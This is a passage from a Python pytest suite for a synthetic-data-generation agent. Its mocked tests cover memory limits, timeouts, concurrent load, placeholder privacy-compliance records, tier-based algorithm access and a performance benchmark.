                    memory_delta = memory_after - memory_before
                    
                    if scenario['expected_to_pass']:
                        # Should complete successfully with reasonable memory usage
                        # Allow up to 100MB for large dataset generation
                        max_allowed_memory = 100 * 1024 * 1024
                        assert memory_delta < max_allowed_memory, \
                            f"Excessive memory usage for size {scenario['size']}: {memory_delta} bytes"
                    else:
                        # If it completed, it should have been limited/rejected
                        if hasattr(state, 'synthetic_data_result'):
                            result = state.synthetic_data_result
                            # Should indicate limitation or error
                            result_str = str(result).lower()
                            limit_indicators = ['limit', 'error', 'invalid', 'too large', 'exceeded']
                            assert any(indicator in result_str for indicator in limit_indicators), \
                                f"Large dataset size {scenario['size']} should have been limited"
                    
                except (MemoryError, OverflowError):
                    # These are acceptable for very large requests
                    if scenario['expected_to_pass']:
                        pytest.fail(f"Unexpected resource error for reasonable size {scenario['size']}")
                    
                except Exception as e:
                    # Other exceptions should be handled gracefully
                    if scenario['expected_to_pass']:
                        error_msg = str(e).lower()
                        assert any(keyword in error_msg for keyword in ['size', 'limit', 'resource', 'memory']), \
                            f"Unexpected error for reasonable size {scenario['size']}: {e}"
        
        # Verify overall memory usage is reasonable
        memory_usage_final = self._get_memory_usage()
        memory_growth = memory_usage_final - memory_usage_start
        
        assert memory_growth < MEMORY_LEAK_THRESHOLD, \
            f"Memory leak during resource exhaustion tests: {memory_growth} bytes growth"
    
    @pytest.mark.asyncio
    async def test_data_generation_timeout_and_cancellation(self, mock_data_generation_dependencies, valid_user_context):
        """Test data generation behavior under timeout and cancellation scenarios."""
        data_agent = await self.create_data_agent_with_context(
            mock_data_generation_dependencies, valid_user_context
        )
        
        # Mock slow data generation process
        async def slow_generation_process(*args, **kwargs):
            await asyncio.sleep(30)  # Very slow generation
            return None
        
        state = DeepAgentState()
        state.user_request = "Generate data that will timeout"
        state.user_id = valid_user_context.user_id
        
        # Mock the generation executor to be slow
        with patch.object(data_agent.generation_executor, 'execute_generation', side_effect=slow_generation_process):
            with patch.object(data_agent, '_determine_workload_profile') as mock_profile:
                mock_workload = Mock()
                mock_workload.dataset_size = 1000
                mock_workload.workload_type = "timeout_test"
                mock_profile.return_value = mock_workload
                
                with patch.object(data_agent.approval_requirements, 'check_approval_requirements', return_value=False):
                    
                    # Execute with timeout - should handle gracefully
                    with pytest.raises(asyncio.TimeoutError):
                        await asyncio.wait_for(
                            data_agent.execute(state, f"{valid_user_context.run_id}_timeout", stream_updates=False),
                            timeout=3.0  # 3 second timeout
                        )
                    
                    # Verify the context and agent state is still valid after timeout
                    assert data_agent.user_context.user_id == valid_user_context.user_id
                    assert state.user_request is not None
    
    def _get_memory_usage(self) -> int:
        """Get current memory usage."""
        try:
            import psutil
            import os
            process = psutil.Process(os.getpid())
            return process.memory_info().rss
        except ImportError:
            # Fallback if psutil not available
            import sys
            return sys.getsizeof(gc.get_objects())


class TestDataGenerationPerformanceAndStress(DataGenerationContextMigrationTestSuite):
    """Performance and stress testing for data generation operations."""
    
    @pytest.mark.asyncio
    async def test_high_volume_concurrent_data_generation(self, mock_data_generation_dependencies):
        """Test data generation performance under high concurrent load."""
        num_concurrent_requests = MAX_CONCURRENT_DATA_GENERATION
        start_time = time.time()
        
        # Create diverse data generation requests
        generation_patterns = [
            "Generate {size} {data_type} records for {purpose}",
            "Create synthetic {data_type} dataset with {size} entries for {purpose}",
            "Produce {size} {data_type} samples for {purpose} testing",
            "Build {data_type} test data ({size} records) for {purpose}",
            "Generate {purpose} {data_type} with {size} data points"
        ]
        
        data_types = ["customer", "transaction", "inventory", "user_behavior", "performance"]
        purposes = ["testing", "benchmarking", "validation", "simulation", "analysis"]
        sizes = [100, 500, 1000, 2000, 5000]
        
        async def execute_concurrent_data_generation(request_id):
            user_id = f"perf_data_user_{request_id}"
            pattern = generation_patterns[request_id % len(generation_patterns)]
            
            size = sizes[request_id % len(sizes)]
            data_type = data_types[request_id % len(data_types)]
            purpose = purposes[request_id % len(purposes)]
            
            request_text = pattern.format(size=size, data_type=data_type, purpose=purpose)
            
            context = UserExecutionContext.from_request(
                user_id=user_id,
                thread_id=f"perf_data_thread_{request_id}",
                run_id=f"perf_data_run_{request_id}"
            )
            
            data_agent = await self.create_data_agent_with_context(
                mock_data_generation_dependencies, context
            )
            
            execution_start = time.time()
            
            try:
                state = DeepAgentState()
                state.user_request = request_text
                state.user_id = context.user_id
                
                # Mock workload profile
                mock_profile = Mock()
                mock_profile.dataset_size = size
                mock_profile.workload_type = f"{purpose}_test"
                
                with patch.object(data_agent, '_determine_workload_profile', return_value=mock_profile):
                    with patch.object(data_agent.approval_requirements, 'check_approval_requirements', return_value=False):
                        with patch.object(data_agent.generation_executor, 'execute_generation'):
                            
                            await data_agent.execute(state, context.run_id, stream_updates=False)
                            
                            execution_time = time.time() - execution_start
                            
                            self.stress_metrics.total_generation_requests += 1
                            self.stress_metrics.successful_generations += 1
                            self.stress_metrics.total_records_generated += size
                            
                            return {
                                'request_id': request_id,
                                'user_id': user_id,
                                'execution_time': execution_time,
                                'records_generated': size,
                                'success': True
                            }
                            
            except Exception as e:
                execution_time = time.time() - execution_start
                
                self.stress_metrics.total_generation_requests += 1
                self.stress_metrics.failed_generations += 1
                self.stress_metrics.add_error(e)
                
                return {
                    'request_id': request_id,
                    'user_id': user_id,
                    'execution_time': execution_time,
                    'error': str(e),
                    'success': False
                }
        
        # Execute all requests concurrently
        tasks = [execute_concurrent_data_generation(i) for i in range(num_concurrent_requests)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        total_time = time.time() - start_time
        
        # Process results
        successful_results = [r for r in results if not isinstance(r, Exception) and r.get('success')]
        failed_results = [r for r in results if not isinstance(r, Exception) and not r.get('success')]
        exception_results = [r for r in results if isinstance(r, Exception)]
        
        # Calculate performance metrics
        if successful_results:
            avg_execution_time = sum(r['execution_time'] for r in successful_results) / len(successful_results)
            self.stress_metrics.average_generation_time = avg_execution_time
            
            total_records = sum(r['records_generated'] for r in successful_results)
            records_per_second = self.stress_metrics.calculate_records_per_second(total_time)
        
        # Performance assertions
        success_rate = len(successful_results) / num_concurrent_requests * 100
        
        print(f"Concurrent Data Generation Stress Test Results:")
        print(f"Total requests: {num_concurrent_requests}")
        print(f"Successful: {len(successful_results)} ({success_rate:.1f}%)")
        print(f"Failed: {len(failed_results)}")
        print(f"Exceptions: {len(exception_results)}")
        print(f"Total time: {total_time:.2f}s")
        print(f"Average execution time: {self.stress_metrics.average_generation_time:.3f}s")
        print(f"Total records generated: {self.stress_metrics.total_records_generated}")
        print(f"Records per second: {records_per_second:.1f}")
        print(f"Requests per second: {num_concurrent_requests / total_time:.1f}")
        
        # Assert performance requirements
        assert success_rate >= 90.0, f"Success rate too low for data generation: {success_rate:.1f}%"
        assert total_time < 120.0, f"Total execution time too high for data generation: {total_time:.2f}s"
        assert self.stress_metrics.average_generation_time < 10.0, \
            f"Average generation time too high: {self.stress_metrics.average_generation_time:.3f}s"
        
        # Check for user isolation in high-load scenario
        user_ids = [r['user_id'] for r in successful_results]
        assert len(set(user_ids)) == len(user_ids), "User ID collision in data generation under high load!"


class TestDataGenerationSecurityAndCompliance(DataGenerationContextMigrationTestSuite):
    """Security and compliance-focused tests for data generation."""
    
    @pytest.mark.asyncio
    async def test_generated_data_privacy_compliance(self, mock_data_generation_dependencies):
        """Test that generated data complies with privacy regulations."""
        compliance_scenarios = [
            {
                "regulation": "GDPR",
                "requirements": ["anonymization", "right_to_deletion", "data_minimization"],
                "sensitive_fields": ["email", "name", "address", "phone"]
            },
            {
                "regulation": "HIPAA", 
                "requirements": ["de_identification", "access_controls", "audit_logging"],
                "sensitive_fields": ["ssn", "medical_record", "diagnosis", "treatment"]
            },
            {
                "regulation": "PCI_DSS",
                "requirements": ["card_data_protection", "encryption", "access_restriction"],
                "sensitive_fields": ["card_number", "cvv", "cardholder_name", "expiry_date"]
            }
        ]
        
        for scenario in compliance_scenarios:
            user_id = f"compliance_user_{scenario['regulation']}"
            context = UserExecutionContext.from_request(
                user_id=user_id,
                thread_id=f"compliance_thread_{scenario['regulation']}",
                run_id=f"compliance_run_{scenario['regulation']}",
                metadata={
                    "compliance_requirements": scenario["requirements"],
                    "data_sensitivity": "high",
                    "regulation": scenario["regulation"]
                }
            )
            
            data_agent = await self.create_data_agent_with_context(
                mock_data_generation_dependencies, context
            )
            
            request = f"Generate synthetic data for {scenario['regulation']} compliance testing"
            
            state = DeepAgentState()
            state.user_request = request
            state.user_id = context.user_id
            
            # Mock compliance-aware data generation
            mock_generated_data = []
            for i in range(10):
                record = {"record_id": f"compliance_record_{i}"}
                
                # Add mock sensitive fields with appropriate anonymization
                for field in scenario["sensitive_fields"]:
                    if scenario["regulation"] == "GDPR":
                        record[field] = f"anonymized_{field}_{i}"
                    elif scenario["regulation"] == "HIPAA":
                        record[field] = f"de_identified_{field}_{i}" 
                    elif scenario["regulation"] == "PCI_DSS":
                        record[field] = f"masked_{field}_{i}"
                
                mock_generated_data.append(record)
            
            mock_profile = Mock()
            mock_profile.dataset_size = 10
            mock_profile.workload_type = f"{scenario['regulation']}_testing"
            
            with patch.object(data_agent, '_determine_workload_profile', return_value=mock_profile):
                with patch.object(data_agent.approval_requirements, 'check_approval_requirements', return_value=False):
                    with patch.object(data_agent.generation_executor, 'execute_generation') as mock_gen:
                        
                        # Mock successful generation with compliance-aware data
                        def set_compliant_result(*args, **kwargs):
                            state.synthetic_data_result = {
                                "status": "success",
                                "compliance_verified": True,
                                "regulation": scenario["regulation"],
                                "generated_records": len(mock_generated_data),
                                "privacy_level": "high"
                            }
                        
                        mock_gen.side_effect = set_compliant_result
                        
                        await data_agent.execute(state, context.run_id, stream_updates=False)
                        
                        # Verify compliance indicators in result
                        if hasattr(state, 'synthetic_data_result'):
                            result = state.synthetic_data_result
                            
                            # Should indicate compliance awareness
                            assert result.get("compliance_verified") is True, \
                                f"Compliance not verified for {scenario['regulation']}"
                            
                            assert result.get("regulation") == scenario["regulation"], \
                                f"Regulation not tracked for {scenario['regulation']}"
                            
                            # Record for monitoring
                            self.leak_monitor.record_generated_data(user_id, mock_generated_data)
                            self.leak_monitor.record_generation_metadata(user_id, result)
    
    @pytest.mark.asyncio
    async def test_proprietary_algorithm_security(self, mock_data_generation_dependencies):
        """Test security of proprietary data generation algorithms."""
        # Create users with different access levels
        access_scenarios = [
            {"tier": "enterprise", "access": "proprietary_v3", "allowed": True},
            {"tier": "professional", "access": "enhanced_v2", "allowed": True},
            {"tier": "basic", "access": "standard_v1", "allowed": True},
            {"tier": "trial", "access": "proprietary_v3", "allowed": False},  # Should be denied
            {"tier": "anonymous", "access": "enhanced_v2", "allowed": False}  # Should be denied
        ]
        
        for scenario in access_scenarios:
            user_id = f"algorithm_access_user_{scenario['tier']}"
            context = UserExecutionContext.from_request(
                user_id=user_id,
                thread_id=f"algorithm_thread_{scenario['tier']}",
                run_id=f"algorithm_run_{scenario['tier']}",
                metadata={
                    "user_tier": scenario["tier"],
                    "requested_algorithm": scenario["access"]
                }
            )
            
            data_agent = await self.create_data_agent_with_context(
                mock_data_generation_dependencies, context
            )
            
            request = f"Generate data using {scenario['access']} algorithm"
            
            state = DeepAgentState()
            state.user_request = request
            state.user_id = context.user_id
            
            # Mock algorithm access control
            def check_algorithm_access(algorithm_name):
                if not scenario["allowed"]:
                    raise PermissionError(f"Access denied to {algorithm_name} for tier {scenario['tier']}")
                
                return {
                    "algorithm_used": algorithm_name,
                    "access_granted": True,
                    "user_tier": scenario["tier"]
                }
            
            mock_profile = Mock()
            mock_profile.dataset_size = 100
            mock_profile.workload_type = "algorithm_security_test"
            
            with patch.object(data_agent, '_determine_workload_profile', return_value=mock_profile):
                with patch.object(data_agent.approval_requirements, 'check_approval_requirements', return_value=False):
                    with patch.object(data_agent.generation_executor, 'execute_generation') as mock_gen:
                        
                        if scenario["allowed"]:
                            # Should succeed for allowed access
                            mock_gen.return_value = None
                            
                            try:
                                await data_agent.execute(state, context.run_id, stream_updates=False)
                                
                                # Verify execution completed for allowed users
                                mock_gen.assert_called_once()
                                
                            except Exception as e:
                                # Should not fail for allowed access
                                pytest.fail(f"Allowed access failed for {scenario['tier']}: {e}")
                        
                        else:
                            # Should be denied for non-allowed access
                            mock_gen.side_effect = PermissionError(f"Access denied for {scenario['tier']}")
                            
                            with pytest.raises((PermissionError, Exception)):
                                await data_agent.execute(state, context.run_id, stream_updates=False)


# Performance benchmarking for data generation operations
@pytest.mark.benchmark
class TestDataGenerationPerformanceBenchmarks(DataGenerationContextMigrationTestSuite):
    """Benchmark tests for data generation performance regression detection."""
    
    @pytest.mark.asyncio
    async def test_data_generation_execution_benchmark(self, benchmark, mock_data_generation_dependencies):
        """Benchmark data generation execution performance."""
        context = UserExecutionContext.from_request(
            user_id="benchmark_data_user",
            thread_id="benchmark_data_thread", 
            run_id="benchmark_data_run"
        )
        
        async def execute_data_generation_benchmark():
            data_agent = await self.create_data_agent_with_context(
                mock_data_generation_dependencies, context
            )
            
            state = DeepAgentState()
            state.user_request = "Generate 1000 customer records for performance benchmarking"
            state.user_id = context.user_id
            
            mock_profile = Mock()
            mock_profile.dataset_size = 1000
            mock_profile.workload_type = "performance_benchmark"
            
            with patch.object(data_agent, '_determine_workload_profile', return_value=mock_profile):
                with patch.object(data_agent.approval_requirements, 'check_approval_requirements', return_value=False):
                    with patch.object(data_agent.generation_executor, 'execute_generation'):
                        
                        await data_agent.execute(state, context.run_id, stream_updates=False)
                        return state
        
        result = await execute_data_generation_benchmark()  # Warm up
        benchmark(lambda: asyncio.run(execute_data_generation_benchmark()))


# Test configuration and runners
if __name__ == "__main__":
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--asyncio-mode=auto", 
        "--timeout=600",  # 10 minute timeout per test (data generation can be slow)
        "-x"  # Stop on first failure
    ])